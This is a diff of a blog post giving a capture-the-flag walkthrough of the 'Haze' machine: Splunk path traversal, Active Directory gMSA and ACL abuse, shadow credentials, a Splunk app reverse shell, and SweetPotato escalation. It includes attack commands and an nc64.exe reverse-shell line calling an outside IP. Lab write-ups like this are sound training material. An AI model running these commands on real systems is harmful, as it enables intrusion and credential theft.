@@ -9,87 +9,87 @@ thumb: /assets/images/logos/44e14228c6a208714eda356bda7624a8.webp
 # Haze
 
 # 1. Enumeration
-
+<br/><br/>
 Start port enumeration
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_1.png' | relative_url }})
-
+<br/><br/>
 Splunk web service is running on port 8000, a login form is displayed but we don’t have any credentials yet
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_2.png' | relative_url }})
-
+<br/><br/>
 # 2. User flag
-
+<br/><br/>
 Search the internet to identify vulnerabilities like CVE-2024-36991. Arbitrary file read through reverse path traversal, this is possible thanks to `os.path.join` which concatenates the whole path ignoring any part of the string that includes a drive letter (`c:` in this case) 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_3.png' | relative_url }})
-
+<br/><br/>
 The next payload will be processed by the function and it will take the first `C:` probably located in the backend and it will ignore any other `C:` references treating the next as part of the path, in this way, path traversal filtering will be bypassed disclosing files outside the current directory
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_4.png' | relative_url }})
-
+<br/><br/>
 Check `/etc/passwd` to confirm this environment is vulnerable, some hashes were found but they are not easy crackeable
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_5.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_6.png' | relative_url }})
-
+<br/><br/>
 Chat-gpt helps us to locate interesting taking advantage of splunk
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_7.png' | relative_url }})
-
+<br/><br/>
 The secret is disclosed, now we need hashes to crack with this secret
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_8.png' | relative_url }})
-
+<br/><br/>
 In the configuration files we will discover some hashes
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_9.png' | relative_url }})
-
+<br/><br/>
 However, only in the authentication file does a hash have a Common Name
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_10.png' | relative_url }})
-
+<br/><br/>
 Use `splunksecrets` tool to decrypt the hash found using the secret disclosed
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_11.png' | relative_url }})
-
+<br/><br/>
 Make sure that this password is valid on ldap authentication
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_12.png' | relative_url }})
-
+<br/><br/>
 It’s time to enumerate user in the domain
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_13.png' | relative_url }})
-
+<br/><br/>
 Use those users to spray the password
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_14.png' | relative_url }})
-
+<br/><br/>
 `mark.adams` is also using the same password, we can check if there are any useful share to obtain more information but this step did not succeed
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_15.png' | relative_url }})
-
+<br/><br/>
 Those credentials might be convenient for enumerating the entire domain using `bloodhound-python`
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_16.png' | relative_url }})
-
+<br/><br/>
 `Mark.adams` account is member of `GMSA_MANAGERS` group
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_17.png' | relative_url }})
-
+<br/><br/>
 We can confirm that using Powershell
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_18.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_19.png' | relative_url }})
-
+<br/><br/>
 Attackers can abuse misconfigured gMSA to escalate privileges. This group (Group Managed Service Account) are assigned to automate password rotation but  only specific accounts should have `readgMSApassword` privilege, in this scenario we have compromised a gMSA manager’s member.
-
+<br/><br/>
 Bloodhound did not display members of gMSA. To enumerate users in the domain and identify which accounts can retrieve gMSA passwords or modify its properties, we can execute the following commands:
-
+<br/><br/>
 ```python
 Get-ADServiceAccount -Filter *
 Get-ADServiceAcount Haze-IT-Backup -Property PrincipalsAllowedToRetrieveManagedPassword
@@ -97,145 +97,150 @@ Get-ADServiceAcount Haze-IT-Backup -Property PrincipalsAllowedToRetrieveManagedP
 $backupuser = Get-ADServiceAccount Haze-IT-Backup
 (Get-Acl "AD:\$($backupuser.DistinguishedName)").Access | Where-Object {$_.IdentityReference -like '*gMSA_Manage'}
 ```
-
+<br/><br/>
 Other options to shortcut this enumeration could be:
-
+<br/><br/>
 - `get writeables` in `bloodyAD`
 - Find-`InterestingDomainAcl` in `PowerView.ps1` module
-
+<br/><br/>
 Once we know gMSA managers can set Haze-IT-Backup property to retrieve its managed password we proceed to abuse this
-
+<br/><br/>
 ```python
 Set-ADServiceAccount -Identity "Haze-IT-Backup" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_20.png' | relative_url }})
-
+<br/><br/>
 This misconfiguration can be leverage to obtain the NTLM hash of the backup account
-
+<br/><br/>
 ```python
 nxc ldap ip -u user -p password --gmsa
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_21.png' | relative_url }})
-
+<br/><br/>
 Haze-IT-Backup has WriteOwner permissions over support_services group, but seems to be something else to investigate
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_22.png' | relative_url }})
-
+<br/><br/>
 Execute the `bloodhound-python` collector again, this time using backup user’s credentials
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_23.png' | relative_url }})
-
+<br/><br/>
 Now the path forward is clearer
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_24.png' | relative_url }})
-
+<br/><br/>
 Set `haze-it-backup` as the new owner of `support_services` and grant it `full-control` over the group
-
+<br/><br/>
 ```python
 impacker-owneredit -action write -new-owner 'new-owner' -target-dn 'target-dn' 'domain'/'user' -no-pass -hashes :hash
 impacket-dacledit -action write -rights FullControl -principal 'attacker' -target-dn 'target-dn' 'domain'/'user' -no-pass -hashes :hash
 #Or without imapcket 
 pth-net rpc group addmem "SUPPORT_SERVICE" attackeruser -U 'domain'/'attacker'%'fffto_supply_right_format':'hash' -S ip
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_25.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_26.png' | relative_url }})
-
+<br/><br/>
 We have three options right now:
-
+<br/><br/>
 - Change edward.martin password’s (Faster but not a clean OPSEC, and not allowed in this machine)
+<br/><br/>
 - Request a TGT again and use certipy shadow credential to obtain edward hash (Automated and faster)
+<br/><br/>
 - Using pywhisker → gettgtpkinit → getnthash (A manual and more granular approach)
-
+<br/><br/>
 ```python
 #To update msDS-KeyCredentialLink and obtain a PFX from this link
 python3 pywhisker.py -u 'attacker' -H :hash -d domain -t 'target' -a add
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_27.png' | relative_url }})
-
+<br/><br/>
 ```python
 #Get a tgt using the PFX file generated previously
 python gettgtpkinit -cert-pfx .pxf -pfx-pass pfxpass -dc-ip ip domain/target target.ccfile
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_28.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_29.png' | relative_url }})
-
+<br/><br/>
 ```python
 #Get a NT hash using that tgt
 python getnthash.py -dc-ip ip -key key domain/target
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_30.png' | relative_url }})
-
+<br/><br/>
 We can spawn a `edward.martin` shell using `evil-winrm` to obtain the user flag
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_31.png' | relative_url }})
-
+<br/><br/>
 # 3.Priv esc
-
+<br/><br/>
 Check the splunk directories until you locate a backup
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_32.png' | relative_url }})
-
+<br/><br/>
 Another version of the files we have abused early was in there with different hash and different secret
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_33.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_34.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_35.png' | relative_url }})
-
+<br/><br/>
 Crack the hash we found
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_36.png' | relative_url }})
-
+<br/><br/>
 It is supposed `alexander.green` credentials
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_37.png' | relative_url }})
-
+<br/><br/>
 Log in with that password in the main web application service as the admin user 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_38.png' | relative_url }})
-
+<br/><br/>
 From here, it is straightforward, find how to exploit a reverse shell in splunk 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_39.png' | relative_url }})
-
+<br/><br/>
 Set ip and port in `run.ps1` as we are dealing with a Windows machine 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_40.png' | relative_url }})
-
+<br/><br/>
 Follow the instructions in the repository. Compress those files
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_41.png' | relative_url }})
-
+<br/><br/>
 Then, upload them as an app installation in splunk
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_42.png' | relative_url }})
-
+<br/><br/>
 It is successfully installed, we only need to enable it to trigger the reverse shell
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_43.png' | relative_url }})
-
+<br/><br/>
 After obtaining a shell, enumerating Alexander’s privileges we discovered `SeImpersonatePriviele` 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_44.png' | relative_url }})
-
+<br/><br/>
 This privilege allow us to use a process to impersonate another user, `SweetPotato` pr `godpotato` are recommended tools for this task
-
+<br/><br/>
 ```python
 .\SweetPotato.exe -a 'type c:\users\administrator\desktop\root.txt'
 #Or upload a nc.exe file and execute
 .\SweetPotato.exe -a "C:\programdata\nc64.exe 10.10.14.6 444 -e cmd.exe"
 ```
-
+<br/><br/>
 ![image.png]({{ '/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_45.png' | relative_url }})
-
+<br/><br/>
 Machine pwned@!@@!@
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
